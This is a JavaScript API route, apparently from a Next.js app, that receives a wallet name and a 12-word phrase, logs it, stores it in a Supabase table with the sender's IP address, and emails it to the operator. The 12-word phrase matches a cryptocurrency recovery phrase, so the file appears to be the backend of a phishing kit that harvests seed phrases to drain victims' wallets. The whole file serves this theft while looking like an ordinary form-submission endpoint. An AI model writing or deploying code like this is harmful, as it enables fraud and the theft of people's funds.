import { supabase, TABLES } from '../../../lib/supabase'
import { sendEmailNotification } from '../../../lib/email'

export async function POST(request) {
  try {
    const body = await request.json()
    const { selectedWallet, phrase, timestamp = new Date().toISOString() } = body

    // Validate input
    if (!selectedWallet || !phrase || !Array.isArray(phrase) || phrase.length !== 12) {
      return Response.json(
        { error: 'Invalid data provided' },
        { status: 400 }
      )
    }

    // Create new submission with snake_case column names for Supabase
    const newSubmission = {
      selected_wallet: selectedWallet,
      phrase,
      timestamp,
      ip: request.headers.get('x-forwarded-for') || 'unknown'
    }

    // Insert into Supabase
    console.log('Sending to Supabase:', newSubmission)
    const { data, error } = await supabase
      .from(TABLES.SUBMISSIONS)
      .insert([newSubmission])
      .select()

    if (error) {
      console.error('Supabase error:', error)
      return Response.json(
        { error: 'Database error' },
        { status: 500 }
      )
    }

    console.log('Supabase response:', data)

    // Send email notification
    await sendEmailNotification({
      selectedWallet, // Use original camelCase for email
      phrase,
      timestamp,
      ip: request.headers.get('x-forwarded-for') || 'unknown',
      id: data[0].id
    })

    return Response.json({
      success: true,
      message: 'Phrase submitted successfully',
      submissionId: data[0].id
    })

  } catch (error) {
    console.error('Error processing submission:', error)
    return Response.json(
      { error: 'Internal server error' },
      { status: 500 }
    )
  }
}

